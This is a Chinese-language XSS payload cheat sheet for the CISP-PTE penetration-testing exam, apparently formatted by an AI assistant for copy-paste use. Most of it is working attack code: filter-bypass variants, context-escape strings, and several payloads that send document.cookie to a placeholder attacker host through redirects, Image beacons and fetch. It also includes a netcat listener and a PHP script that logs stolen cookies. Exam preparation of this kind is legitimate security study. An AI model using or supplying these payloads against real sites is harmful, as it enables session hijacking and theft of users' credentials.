我已经帮你**完整修复格式、补全丢失的 Payload、修正表格错乱、统一排版**，整理成一份干净、可直接复制使用的 **CISP-PTE XSS 考试专用 Payload 速查清单（完整版）**，你可以直接保存为 `.md` 使用。

# CISP-PTE XSS 考试专用 Payload 速查清单

## 考前核心提醒

1. 考试中 XSS 核心目标：**获取 Cookie / 触发指定操作**（而非仅弹窗），弹窗仅用于验证漏洞存在；
2. 第一步先判断**输出上下文**（标签内 / 属性内 / JS 内），再选对应 Payload；
3. 遇到过滤先测试：输入 `<>`/`script`/`onerror` 看是否被拦截，再调整变形。

---

## 一、按输出上下文分类（核心 Payload）


| 输出上下文/场景                 | 核心 Payload 模板                                                                 | 适用场景&考试说明                            |
| :------------------------------ | :-------------------------------------------------------------------------------- | :------------------------------------------- |
| HTML 标签内容区（无过滤）       | `<script>alert(1)</script>`                                                       | 验证漏洞存在，考试优先测试，被过滤再换方案   |
| 标签过滤绕过（script 被禁）     | `<img src=x onerror=alert(1)>`                                                    | 过滤`script` 标签时使用，考试最常用替代方案  |
| 进阶绕过（事件过滤）            | `<svg onload=alert(1)>`                                                           | 过滤`onerror` 时使用，svg 兼容性好，考试高频 |
| HTML 标签属性值（input 双引号） | `" onmouseover=alert(1) x="`                                                      | 双引号未过滤，闭合 value 属性+悬浮事件       |
| a 标签 href 属性                | `" onclick=alert(1) href="`                                                       | 闭合 href 属性+点击事件，需用户交互          |
| 单引号属性场景                  | `' onfocus=alert(1) x='`                                                          | 属性用单引号包裹时使用                       |
| JS 字符串上下文（双引号）       | `";alert(1);//`                                                                   | 场景：`var x="用户输入";`，闭合引号执行代码  |
| JS 字符串上下文（单引号）       | `';alert(1);//`                                                                   | 场景：`var x='用户输入';`，考试优先测试      |
| 编码绕过（alert 过滤）          | `"\u0061\u006c\u0065\u0072\u0074(1);//`                                           | Unicode 编码 alert，绕过关键字过滤           |
| URL 伪协议场景                  | `javascript:alert(1)`                                                             | 无过滤直接使用，点击链接触发                 |
| 伪协议编码绕过                  | `jav&#97;script:alert(1)`                                                         | 过滤`javascript` 时用 HTML 实体绕过          |
| 拿 Cookie 基础版                | `<script>document.location='http://你的IP:端口?c='+document.cookie</script>`      | 无过滤时跳转外带 Cookie，需 NC 监听          |
| 拿 Cookie（img 无跳转）         | `<img src=x onerror="document.location='http://你的IP:端口?c='+document.cookie">` | 过滤 script 标签时，考试最常用               |
| 拿 Cookie（隐蔽 Image）         | `<script>new Image().src='http://你的IP:端口/?c='+document.cookie;</script>`      | 无页面跳转，最隐蔽                           |

---

## 二、常见过滤规则绕过变形（考试必背）


| 被过滤内容 | 绕过方式                 | 示例 Payload                         |
| :--------- | :----------------------- | :----------------------------------- |
| `script`   | 大小写混淆 / 实体编码    | `<ScRiPt>alert(1)</ScRiPt>`          |
| `onerror`  | 更换事件                 | `<img src=x onload=alert(1)>`        |
| `<>`       | HTML 实体编码            | `&lt;img src=x onerror=alert(1)&gt;` |
| 空格       | `/` / `%0a` / `Tab` 替代 | `<img/src=x/onerror=alert(1)>`       |
| `alert`    | 字符串拼接 / Base64      | `eval('al'+'ert(1)')`                |
| `alert`    | Base64 解码执行          | `eval(atob('YWxlcnQoMSk='))`         |

---

## 三、考场实战步骤（1 分钟快速验证+利用）

1. 输入 `<script>alert(1)</script>` → 弹窗=无过滤，直接使用外带 Cookie Payload；
2. 无弹窗→输入 `<img src=x onerror=alert(1)>` → 弹窗=标签过滤，使用事件类 Payload；
3. 仍无弹窗→测试单/双引号闭合（如 `"`/`'`）→ 确认属性上下文，使用属性闭合 Payload；
4. 关键字被过滤→使用大小写/双写/编码变形；
5. 验证漏洞后，替换为**外带 Cookie Payload**（填写自己的 IP 和端口），完成考试要求。

---

## 四、隐蔽外传方式（避免页面跳转）

### 1. Image 对象外传（最经典、最隐蔽）

```html
<script>new Image().src='http://你的IP:端口/?c='+document.cookie;</script>
```

### 2. Fetch API 外传（现代浏览器通用）

```html
<script>fetch('http://你的IP:端口/',{method:'POST',body:document.cookie});</script>
```

### 3. SVG 标签外传

```html
<svg/onload="new Image().src='http://你的IP:端口/?'+document.cookie">
```

---

## 五、关键字过滤绕过（考试高频）

### 1. 过滤 `document.cookie`

```html
<script>alert(document['coo'+'kie'])</script>
```

### 2. 过滤 `document`

```html
<script>alert(window['docu'+'ment']['cookie'])</script>
```

### 3. 十六进制编码绕过

```html
<script>eval('\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29')</script>
```

---

## 六、特殊上下文闭合（逃逸技巧）

### 1. JS 变量内（单引号字符串）

```
';new Image().src='http://你的IP:端口/?'+document.cookie;//
```

### 2. JS 变量内（双引号字符串）

```
";new Image().src="http://你的IP:端口/?"+document.cookie;//
```

### 3. HTML 属性内（input 双引号）

```
" onfocus="new Image().src='http://你的IP:端口/?'+document.cookie" autofocus="
```

---

## 七、考场实用：快速搭建接收端

### 1. NC 临时监听

```bash
nc -lvvp 端口
```

### 2. PHP 日志记录脚本

```php
<?php
$cookie = $_GET['c'];
$file = fopen("log.txt", "a");
fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . " | Cookie: " . $cookie . "\n");
fclose($file);
?>
```

启动服务：

```bash
php -S 0.0.0.0:端口
```

---

## 八、核心避坑提醒

1. **HttpOnly**：Cookie 带 HttpOnly 时 JS 无法读取，需换 CSRF 等其他方式；
2. **符号过滤**：`()` 被过滤可尝试反引号：``<script>alert`1`</script>``；
3. **URL 编码**：通过 URL 提交时，对 `+&=#` 等特殊字符做 URL 编码，防止截断；
4. **自动触发**：配合 `autofocus` 可无需用户交互直接触发事件。
